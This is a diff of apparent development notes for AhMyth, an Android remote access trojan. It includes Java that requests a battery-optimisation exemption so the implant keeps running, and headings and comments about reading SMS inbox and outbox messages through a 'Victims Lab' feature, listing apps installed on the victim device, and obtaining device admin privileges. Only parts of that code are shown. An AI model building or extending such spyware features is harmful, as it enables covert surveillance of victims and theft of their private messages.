@@ -13,23 +13,15 @@ import android.provider.Settings;
 
 public class MainActivity extends Activity {
 
- 
-
   @Override
 
   protected void onCreate(Bundle savedInstanceState) {
 
     super.onCreate(savedInstanceState);
-
-   
-
-               
-
+    
     requestIgnoreBatteryOptimizationPermission();
 
   }
-
- 
 
   private void requestIgnoreBatteryOptimizationPermission() {
 
@@ -38,9 +30,7 @@ public class MainActivity extends Activity {
       String packageName = getPackageName();
 
       Intent intent = new Intent();
-
       intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-
       intent.setData(Uri.parse("package:" + packageName));
 
       startActivity(intent);
@@ -54,6 +44,7 @@ public class MainActivity extends Activity {
 
 ## Updated SMS Manager
 This should hopefully allow viewing of both inbox and outbox messages when using the Victims Lab SMS feature, Server Updates also required to allow this to work.
+- SmsManager.java
 ```java
 public static JSONObject getSMSInboxList(){
 
@@ -144,6 +135,7 @@ public static JSONObject getSMSOutboxList(){
 }
 ```
 ## List Installed apps
+This will hopefully Allow AhMyth to list apps that are installed on the victim device
 
 - AppList.java
 
@@ -224,8 +216,7 @@ public class AppList {
 }
 
 ```
-
-
+<br></br>
 # Possible upgrades 
 ## Possible Device Admin Privileges
 
